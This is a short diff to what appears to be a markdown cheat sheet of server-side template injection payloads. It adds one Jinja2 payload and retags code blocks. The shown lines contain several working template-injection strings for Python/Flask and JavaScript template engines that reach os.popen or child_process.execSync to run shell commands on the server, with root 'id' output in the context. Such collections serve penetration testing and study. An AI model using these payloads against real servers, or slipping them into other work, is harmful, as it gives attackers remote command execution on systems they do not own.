@@ -690,13 +690,16 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 #### [+] or we can try those above commands also, if the previous one doesn't works.
-```
+```python
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+```
+```python
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 ```python
 {{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
 ```
-```python
+```js
 {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
 ```
 --------------------------------------------------------------------------------
